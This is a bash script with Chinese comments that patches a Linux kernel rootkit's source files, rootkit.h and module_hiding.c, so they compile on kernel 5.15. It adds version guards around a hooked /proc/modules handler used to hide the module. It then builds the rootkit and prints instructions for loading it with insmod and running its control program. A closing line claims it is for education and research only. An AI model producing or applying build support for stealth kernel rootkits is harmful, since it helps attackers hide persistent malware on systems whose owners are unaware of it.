#!/bin/bash

# Linux内核5.15兼容性修复脚本
# 此脚本修复在Linux内核5.15上编译rootkit时遇到的兼容性问题

echo "=== Linux内核5.15兼容性修复 ==="

# 检查是否在Linux系统上
if [ "$(uname -s)" != "Linux" ]; then
    echo "❌ 错误: 此脚本只能在Linux系统上运行"
    exit 1
fi

echo "✅ 检测到Linux系统"

# 检查内核版本
KERNEL_VERSION=$(uname -r)
echo "内核版本: $KERNEL_VERSION"

# 备份原始文件
echo "\n📁 备份原始文件..."
cp rootkit.h rootkit.h.backup
cp module_hiding.c module_hiding.c.backup
echo "✅ 备份完成"

# 应用修复
echo "\n🔧 应用内核5.15兼容性修复..."

# 修复rootkit.h
echo "修复 rootkit.h..."
sed -i 's/#include <linux\/dirent.h>/\/\/ #include <linux\/dirent.h> \/* 条件包含以避免重复定义 *\//' rootkit.h

# 在适当位置添加条件包含
sed -i '/^#include <net\/sock.h>/a\
\
// 条件包含dirent.h以避免重复定义\
#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,6,0)\
#include <linux/dirent.h>\
#endif' rootkit.h

# 为linux_dirent64结构体添加条件编译
sed -i '/^struct linux_dirent64 {/i\
// 只在内核版本小于5.6时定义linux_dirent64结构体\
#if LINUX_VERSION_CODE < KERNEL_VERSION(5,6,0)' rootkit.h

sed -i '/^struct linux_dirent64 {/,/^};/{
/^};/a\
#endif
}' rootkit.h

# 修复module_hiding.c
echo "修复 module_hiding.c..."

# 移除THIS_MODULE重复声明
sed -i 's/extern struct module \*THIS_MODULE;/\/\/ THIS_MODULE已在内核头文件中定义，无需重复声明/' module_hiding.c

# 为原始函数指针添加条件编译
sed -i '/static int (\*original_proc_modules_show)/i\
// 原始函数指针（仅在旧内核版本中使用）\
#if LINUX_VERSION_CODE < KERNEL_VERSION(5,6,0)' module_hiding.c

sed -i '/static struct file_operations \*original_proc_modules_fops;/a\
#endif' module_hiding.c

# 为函数声明添加条件编译
sed -i '/static int hooked_proc_modules_show/i\
#if LINUX_VERSION_CODE < KERNEL_VERSION(5,6,0)' module_hiding.c
sed -i '/static int hooked_proc_modules_show/a\
#endif' module_hiding.c

echo "✅ 修复完成"

# 验证修复
echo "\n🔍 验证修复..."
if grep -q "LINUX_VERSION_CODE" rootkit.h && grep -q "LINUX_VERSION_CODE" module_hiding.c; then
    echo "✅ 条件编译宏已添加"
else
    echo "❌ 修复可能不完整"
fi

# 尝试编译
echo "\n🔨 尝试编译..."
if make clean && make; then
    echo "\n🎉 编译成功！"
    echo "\n生成的文件:"
    ls -la *.ko 2>/dev/null
    ls -la control 2>/dev/null
    
    echo "\n✅ 修复完成，rootkit已成功编译"
    echo "\n使用方法:"
    echo "1. 加载模块: sudo insmod rootkit.ko"
    echo "2. 使用控制程序: sudo ./control"
    echo "3. 卸载模块: sudo rmmod rootkit"
else
    echo "\n❌ 编译仍然失败"
    echo "\n恢复备份文件..."
    mv rootkit.h.backup rootkit.h
    mv module_hiding.c.backup module_hiding.c
    echo "已恢复原始文件"
    
    echo "\n请检查以下可能的问题:"
    echo "1. 内核头文件是否正确安装"
    echo "2. 内核版本是否支持"
    echo "3. 编译工具是否完整"
    exit 1
fi

# 清理备份文件
echo "\n🧹 清理备份文件..."
rm -f *.backup
echo "✅ 清理完成"

echo "\n=== 修复完成 ==="
echo "\n⚠️  注意: 此rootkit仅用于教育和研究目的"
echo "请在受控环境中测试，遵守相关法律法规"